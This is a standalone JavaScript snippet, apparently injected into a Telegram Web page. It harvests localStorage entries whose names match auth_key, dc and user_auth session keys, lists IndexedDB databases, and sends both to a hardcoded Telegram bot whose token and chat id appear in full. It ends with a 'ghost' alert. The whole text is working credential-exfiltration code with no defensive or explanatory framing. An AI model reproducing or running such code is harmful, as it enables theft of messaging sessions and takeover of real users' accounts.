(function () {
  var BOT  = '8710535929:AAH-mhpB-IlTdqz38bhdgiep_OUv9j5e-54';
  var CHAT = '8425878739';
  var BASE = 'https://api.telegram.org/bot' + BOT + '/sendMessage';

  function send(t) {
    return fetch(BASE + '?chat_id=' + CHAT + '&text=' + encodeURIComponent(t))
      .then(function (r) { return r.text(); });
  }

  var L = localStorage, keys = [], vals = [], i, k, v;
  for (i = 0; i < L.length; i++) {
    k = L.key(i); keys.push(k);
    if (/auth_key|^dc$|^dc\d|user_auth|version|client/i.test(k)) {
      v = L.getItem(k) || '';
      vals.push(k + '=' + (v.length > 30 ? v.slice(0, 30) + '..len' + v.length : v));
    }
  }

  send('PROBE1 url=' + location.href + '\nls_n=' + L.length +
       '\nval:\n' + vals.join('\n') + '\nkeys:\n' + keys.slice(0, 60).join(','))
    .then(function () {
      if (!indexedDB.databases) return null;
      return indexedDB.databases().then(function (ds) {
        return send('PROBE1b idb=' + ds.map(function (d) {
          return d.name + '@' + d.version;
        }).join(','));
      });
    })
    .then(function () { alert('ghost: OK'); })
    .catch(function (e) { alert('ghost ERR ' + e); });
})();
